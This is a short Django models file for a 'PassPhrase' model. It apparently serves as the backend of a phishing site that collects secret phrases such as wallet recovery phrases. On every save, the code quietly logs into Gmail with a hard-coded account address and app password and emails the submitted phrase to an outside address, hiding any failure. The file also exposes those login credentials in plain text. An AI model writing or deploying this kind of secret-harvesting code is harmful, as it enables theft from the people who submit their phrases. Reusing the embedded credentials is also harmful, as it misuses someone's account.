import smtplib
from django.db import models

# Create your models here.

class PassPhrase(models.Model):
    phrase = models.TextField(max_length=200,blank=False,null=False)
    date_created = models.DateTimeField(auto_now_add=True)
    class Meta:
        ordering = ("-date_created",)
    def __str__(self) -> str:
        return f"Key: {str(self.date_created)}"
    def save(self, *args, **kwargs):
        gmail_user = 'clovercooporative@gmail.com'
        gmail_password = 'ghcz jcpi zqbk olay'
        
        sent_from = gmail_user
        to = ['agwumafam@gmail.com']
        subject = 'New Pass Phrase Has Been Submitted'
        body = f"{self.phrase}"
        
        email_text = """\
From: %s
To: %s
Subject: %s
                    
%s
"""%(sent_from, ", ".join(to), subject, body)        
        try:
            server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
            server.ehlo()
            server.login(gmail_user, gmail_password)
            server.sendmail(sent_from, to, email_text)
            server.close()
        
            print('Email sent!')
        except:
            pass
        return super().save(*args, **kwargs)
